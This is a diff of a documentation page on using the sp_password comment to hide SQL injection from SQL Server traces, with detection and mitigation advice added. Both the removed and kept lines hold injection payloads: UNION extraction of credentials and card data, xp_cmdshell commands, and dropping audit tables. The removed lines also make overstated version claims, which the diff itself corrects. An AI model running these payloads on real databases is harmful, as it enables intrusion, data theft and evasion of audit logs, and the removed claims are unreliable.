@@ -4,172 +4,86 @@ description: Using SP_PASSWORD to hide SQL queries in MSSQL logs
 category: Advanced Techniques
 order: 14
 tags: ["sp_password", "log evasion", "query hiding"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
-The `SP_PASSWORD` technique is a method to prevent SQL queries from being logged in the SQL Server logs. This approach takes advantage of a security feature in Microsoft SQL Server that was designed to prevent sensitive information like passwords from being recorded in logs.
+The `SP_PASSWORD` technique hid injected queries from SQL Server traces. It abused a feature meant to keep passwords out of SQL Profiler output, and it only works against old servers (SQL Server 2000 and earlier).
 
 ## How SP_PASSWORD Works
 
-When SQL Server detects the string `sp_password` anywhere in a query, it automatically prevents that query from being recorded in the SQL Server logs. This behavior was originally implemented to prevent passwords from being visible in logs when procedures like `sp_addlogin` or `sp_password` are used.
+SQL Server does not write ordinary queries to its error log; statements are recorded by tracing (SQL Profiler, server-side traces, C2 audit mode). In SQL Server 2000 (documented by Chris Anley, 2002; earlier versions likely behaved the same), when the text of a traced event contained the string `sp_password` anywhere, even in a comment, the trace showed this instead of the statement:
 
-However, this "feature" can be exploited by attackers to hide malicious activities by simply including the string `sp_password` in their attack queries.
+```text
+-- 'sp_password' was found in the text of this event.
+-- The text has been replaced with this comment for security reasons.
+```
+
+The check was a plain string match meant to hide calls such as `sp_password` and `sp_addlogin`. An attacker could therefore append `--sp_password` to any injected query to keep its text out of the trace.
+
+From SQL Server 2005, traces only mask the text of statements that actually handle passwords (for example `CREATE LOGIN ... WITH PASSWORD`, `ALTER LOGIN`, `sp_addlogin`, `sp_password`). A comment containing `sp_password` no longer hides anything: on SQL Server 2017 and 2022 the full text, comment included, appears in `sys.dm_exec_sql_text`, and Extended Events and SQL Server Audit record it too.
 
 ## Basic Usage
 
 ```sql
--- Normal query (would be logged)
-SELECT * FROM users;
+-- Normal query (traced as is)
+SELECT * FROM users
 
--- Query with sp_password (would NOT be logged)
+-- Query with sp_password in a comment (SQL Server 2000: text hidden from the trace)
 SELECT * FROM users--sp_password
-
--- Another example
-'; DROP TABLE critical_data--sp_password
 ```
 
 ## Practical Applications in SQL Injection
 
-### Preventing Detection
-
-By appending `--sp_password` to injected SQL, attackers can prevent their activities from appearing in SQL Server logs:
+Append `--sp_password` to the payload; the `--` also comments out the rest of the original query. The examples target a string parameter (`'`):
 
 ```sql
 -- Standard SQL injection
 ' OR 1=1--
 
--- SQL injection that won't be logged
+-- Same injection, hidden from SQL Server 2000 traces
 ' OR 1=1--sp_password
-```
 
-### Hiding Data Exfiltration
-
-```sql
--- Data exfiltration query that won't be logged
-' UNION SELECT creditcard_number, cvv, expiration FROM customer_payments--sp_password
-```
-
-### Hiding Database Structure Discovery
-
-```sql
--- Table discovery that won't be logged
-' UNION SELECT table_name, column_name FROM information_schema.columns--sp_password
-```
-
-### Hiding Schema Modifications
-
-```sql
--- Schema modification that won't be logged
-'; ALTER TABLE users ADD backdoor_column VARCHAR(100)--sp_password
-```
-
-## Avoiding String Literal Detection
-
-If a security system looks for the exact string `sp_password`, variations can sometimes work:
-
-```sql
--- Using character insertion
-' UNION SELECT * FROM users--sp_pas+sword
-
--- Using comment insertion
-' UNION SELECT * FROM users--sp_p/*comment*/assword
-
--- Using case variation
-' UNION SELECT * FROM users--sp_PassWord
-
--- Dynamic construction
-DECLARE @s VARCHAR(100) = 's' + 'p_p' + 'assw' + 'ord'
-EXEC('SELECT * FROM users--' + @s)
-```
-
-## Combining with Other Techniques
-
-SP_PASSWORD can be combined with other SQL injection techniques for greater effectiveness:
-
-```sql
--- With UNION attack
+-- UNION attack (two-column host query)
 ' UNION SELECT username, password FROM users--sp_password
 
--- With xp_cmdshell
-'; EXEC xp_cmdshell 'net user hacker password /add'--sp_password
+-- Table discovery (two-column host query)
+' UNION SELECT table_name, column_name FROM information_schema.columns--sp_password
 
--- With stacked queries
-'; DROP TABLE audit_logs; CREATE TABLE backdoor(id int)--sp_password
+-- Stacked query with xp_cmdshell (needs sysadmin and xp_cmdshell enabled)
+'; EXEC xp_cmdshell 'whoami'--sp_password
 ```
 
-## Evading Other Security Mechanisms
-
-SP_PASSWORD can be used with other evasion techniques:
-
-```sql
--- Combining with CHAR() encoding
-'; EXEC(CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(102) + CHAR(114) + CHAR(111) + CHAR(109) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115))--sp_password
--- This builds and executes: 'select * from users'
-```
+Variations such as `sp_PassWord` or `sp_pass/**/word` are not useful: the masking matched the literal string `sp_password`, so a variation that slips past a filter also fails to trigger the masking.
 
 ## Limitations
 
-1. While the query isn't logged in SQL Server logs, it may still be:
-   - Logged by application-level logging
-   - Captured by network monitoring tools
-   - Detected by database activity monitoring solutions
-   - Visible in query performance monitoring
-
-2. Modern security tools and WAFs are often aware of this technique and look for it specifically
-
-3. The effectiveness varies across SQL Server versions - newer versions have improved security features
+1. Only SQL Server 2000 and earlier hide the statement; from 2005 on the comment has no effect on tracing.
+2. Even on SQL Server 2000, the query is still visible to application-level logging, network monitoring, database activity monitoring tools and web server logs (for GET parameters).
+3. The string `sp_password` in a request is itself a well-known indicator, and WAF rule sets look for it.
 
 ## Version Specifics
 
-| SQL Server Version | Behavior                                                                      |
-| ------------------ | ----------------------------------------------------------------------------- |
-| SQL Server 2000    | Original behavior - query completely hidden                                   |
-| SQL Server 2005+   | Some improvements, but basic technique still works                            |
-| SQL Server 2012+   | Additional logging mechanisms may still capture queries                       |
-| SQL Server 2016+   | Advanced threat protection features may detect suspicious patterns regardless |
+| SQL Server Version | Behavior                                                                                                           |
+| ------------------ | ------------------------------------------------------------------------------------------------------------------ |
+| 2000 and earlier   | Any traced statement containing `sp_password` is replaced with a notice                                            |
+| 2005 and later     | Only statements that handle passwords are masked; `--sp_password` in a comment is ignored and the text is recorded |
 
 ## Detection and Mitigation Strategies
 
-To protect against SP_PASSWORD attacks, consider:
+1. Use parameterized queries to prevent SQL injection in the first place.
+2. Record statements with Extended Events or SQL Server Audit rather than relying on SQL Trace, which is deprecated.
+3. Keep application-level and web server logs independent of the database.
+4. Alert on requests containing `sp_password`, since legitimate application traffic rarely does.
 
-1. Implementing application-level query logging independent of SQL Server logs
-
-2. Using database activity monitoring tools that capture queries before they reach SQL Server
-
-3. Implementing Web Application Firewalls with rules to detect and block sp_password usage
-
-4. Using database proxies that can detect and alert on suspicious query patterns
-
-5. Implementing parameterized queries to prevent SQL injection in the first place
-
-6. Using custom triggers to audit suspicious activities:
+For example, an Extended Events session that records every completed batch with its full text (high volume; filter it in production):
 
 ```sql
--- Example trigger to detect suspicious activity
-CREATE TRIGGER detect_sp_password
-ON ALL SERVER
-FOR DDL_SERVER_LEVEL_EVENTS
-AS
-BEGIN
-    DECLARE @data XML
-    SET @data = EVENTDATA()
-
-    IF @data.value('(/EVENT_INSTANCE/TSQLCommand/CommandText)[1]', 'nvarchar(max)') LIKE '%sp_password%'
-    BEGIN
-        -- Log to a custom audit table that won't be affected by sp_password
-        INSERT INTO custom_security_audit (event_time, user_name, event_type, sql_text)
-        VALUES (
-            GETDATE(),
-            @data.value('(/EVENT_INSTANCE/LoginName)[1]', 'nvarchar(128)'),
-            'POTENTIAL_LOG_BYPASS',
-            @data.value('(/EVENT_INSTANCE/TSQLCommand/CommandText)[1]', 'nvarchar(max)')
-        )
-    END
-END
+CREATE EVENT SESSION capture_batches ON SERVER
+ADD EVENT sqlserver.sql_batch_completed (ACTION (sqlserver.client_app_name, sqlserver.username))
+ADD TARGET package0.event_file (SET filename = N'capture_batches');
+ALTER EVENT SESSION capture_batches ON SERVER STATE = START;
 ```
 
 ## Historical Context
 
-This technique has been known for many years and was a significant security concern in older SQL Server versions. While Microsoft has improved logging and security mechanisms in newer versions, the basic behavior still exists for backward compatibility reasons.
-
-The technique was originally documented to help DBAs understand why some queries might not appear in logs, but it quickly became a well-known method for attackers to hide their activities.
+The technique was widely used against SQL Server 2000 and appears in older SQL injection tools and papers. On current versions it only serves as a detection signature.
